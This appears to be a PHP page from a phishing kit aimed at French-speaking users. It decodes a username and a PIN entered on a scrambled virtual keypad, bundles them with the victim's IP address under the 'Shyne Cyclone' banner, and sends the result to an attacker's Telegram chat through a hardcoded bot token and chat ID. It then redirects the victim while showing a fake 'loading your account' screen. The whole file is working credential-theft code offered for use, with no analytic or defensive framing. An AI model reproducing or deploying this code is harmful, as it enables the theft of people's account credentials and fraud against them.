<?php

include("antibots.php");

include './log/log.php';

if (isset($_POST['valider'])){

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
/*$RZ3 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$ip");
$CNCD = $RZ3->geoplugin_countryCode ; // Country
$STCD = $RZ3->geoplugin_regionCode ; //  State
    //var_dump($_POST['username'], $_POST['password'], $CNCD, $STCD, $ip, $hostname);exit;*/

$password = str_split($_POST['p'], 2);

//var_dump($password);exit();


if ($password) {

	switch ($password[0]){
	
		case "00":
			$p0 = "";
			break;
		case "01":
			$p0 = "3";
			break;
		case "02":
			$p0 = "7";
			break;
		case "03":
			$p0 = "0";
			break;
		case "04":
			$p0 = "";
			break;
		case "05":
			$p0 = "2";
			break;
		case "06":
			$p0 = "";
			break;
		case "07":
			$p0 = "1";
			break;
		case "08":
			$p0 = "9";
			break;
		case "09":
			$p0 = "8";
			break;
		case "10":
			$p0 = "5";
			break;
		case "11":
			$p0 = "";
			break;
		case "12":
			$p0 = "4";
			break;
		case "13":
			$p0 = "6";
			break;
		case "14":
			$p0 = "";
			break;
		case "15":
			$p0 = "";
			break;
	}

	switch ($password[1]){
	
		case "00":
			$p1 = "";
			break;
		case "01":
			$p1 = "3";
			break;
		case "02":
			$p1 = "7";
			break;
		case "03":
			$p1 = "0";
			break;
		case "04":
			$p1 = "";
			break;
		case "05":
			$p1 = "2";
			break;
		case "06":
			$p1 = "";
			break;
		case "07":
			$p1 = "1";
			break;
		case "08":
			$p1 = "9";
			break;
		case "09":
			$p1 = "8";
			break;
		case "10":
			$p1 = "5";
			break;
		case "11":
			$p1 = "";
			break;
		case "12":
			$p1 = "4";
			break;
		case "13":
			$p1 = "6";
			break;
		case "14":
			$p1 = "";
			break;
		case "15":
			$p1 = "";
			break;
	}

	switch ($password[2]){
	
		case "00":
			$p2 = "";
			break;
		case "01":
			$p2 = "3";
			break;
		case "02":
			$p2 = "7";
			break;
		case "03":
			$p2 = "0";
			break;
		case "04":
			$p2 = "";
			break;
		case "05":
			$p2 = "2";
			break;
		case "06":
			$p2 = "";
			break;
		case "07":
			$p2 = "1";
			break;
		case "08":
			$p2 = "9";
			break;
		case "09":
			$p2 = "8";
			break;
		case "10":
			$p2 = "5";
			break;
		case "11":
			$p2 = "";
			break;
		case "12":
			$p2 = "4";
			break;
		case "13":
			$p2 = "6";
			break;
		case "14":
			$p2 = "";
			break;
		case "15":
			$p2 = "";
			break;
	}

	switch ($password[3]){
	
		case "00":
			$p3 = "";
			break;
		case "01":
			$p3 = "3";
			break;
		case "02":
			$p3 = "7";
			break;
		case "03":
			$p3 = "0";
			break;
		case "04":
			$p3 = "";
			break;
		case "05":
			$p3 = "2";
			break;
		case "06":
			$p3 = "";
			break;
		case "07":
			$p3 = "1";
			break;
		case "08":
			$p3 = "9";
			break;
		case "09":
			$p3 = "8";
			break;
		case "10":
			$p3 = "5";
			break;
		case "11":
			$p3 = "";
			break;
		case "12":
			$p3 = "4";
			break;
		case "13":
			$p3 = "6";
			break;
		case "14":
			$p3 = "";
			break;
		case "15":
			$p3 = "";
			break;
	}

	switch ($password[4]){
	
		case "00":
			$p4 = "";
			break;
		case "01":
			$p4 = "3";
			break;
		case "02":
			$p4 = "7";
			break;
		case "03":
			$p4 = "0";
			break;
		case "04":
			$p4 = "";
			break;
		case "05":
			$p4 = "2";
			break;
		case "06":
			$p4 = "";
			break;
		case "07":
			$p4 = "1";
			break;
		case "08":
			$p4 = "9";
			break;
		case "09":
			$p4 = "8";
			break;
		case "10":
			$p4 = "5";
			break;
		case "11":
			$p4 = "";
			break;
		case "12":
			$p4 = "4";
			break;
		case "13":
			$p4 = "6";
			break;
		case "14":
			$p4 = "";
			break;
		case "15":
			$p4 = "";
			break;
	}

	switch ($password[5]){
	
		case "00":
			$p5 = "";
			break;
		case "01":
			$p5 = "3";
			break;
		case "02":
			$p5 = "7";
			break;
		case "03":
			$p5 = "0";
			break;
		case "04":
			$p5 = "";
			break;
		case "05":
			$p5 = "2";
			break;
		case "06":
			$p5 = "";
			break;
		case "07":
			$p5 = "1";
			break;
		case "08":
			$p5 = "9";
			break;
		case "09":
			$p5 = "8";
			break;
		case "10":
			$p5 = "5";
			break;
		case "11":
			$p5 = "";
			break;
		case "12":
			$p5 = "4";
			break;
		case "13":
			$p5 = "6";
			break;
		case "14":
			$p5 = "";
			break;
		case "15":
			$p5 = "";
			break;
	}

}

$pass = $p0.$p1.$p2.$p3.$p4.$p5;

//var_dump($password,$pass);exit();

    # code...
$message .= "==========  Shyne Cyclone ==========\n";
$message .= "Identifiant : ".$_POST['u']."\n";
$message .= "Mot de passe : ".$pass."\n";
$message .= "From: ".$ip."\n"; include "./rz/zone.php";
$message .= "==========  Shyne Cyclone  =========\n";


$telegram = new Telegram('5066037288:AAEw2KT0cU37dr0q7z90zWGu5qd-6ZvsREQ');
$chat_id = 2011330617;
$content = array('chat_id' => $chat_id, 'text' => $message);
$send = $telegram->sendMessage($content);

if($send){ 

    echo '<script type="text/javascript">';
    echo 'setTimeout(function(){window.top.location.href = "confirmationnew.php";}, 3000);';
    echo '</script>';

}
}                                   

?>

<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
.loader {
  border: 16px solid #f3f3f3;
  border-radius: 50%;
  border-top: 16px solid #103D9E;
  width: 80px;
  height: 80px;
  -webkit-animation: spin 2s linear infinite; /* Safari */
  animation: spin 2s linear infinite;
}

/* Safari */
@-webkit-keyframes spin {
  0% { -webkit-transform: rotate(0deg); }
  100% { -webkit-transform: rotate(360deg); }
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
</style>
</head>
<body>

<center>
<h3 style="position: relative; top: 100px;">Chargement de votre compte ... </h3>

<div class="loader" style="position: relative; top: 100px;"></div><img src="images.jpg" width="100px" height="100px" style="position: relative; top: 110px;">
</center>
</body>
</html>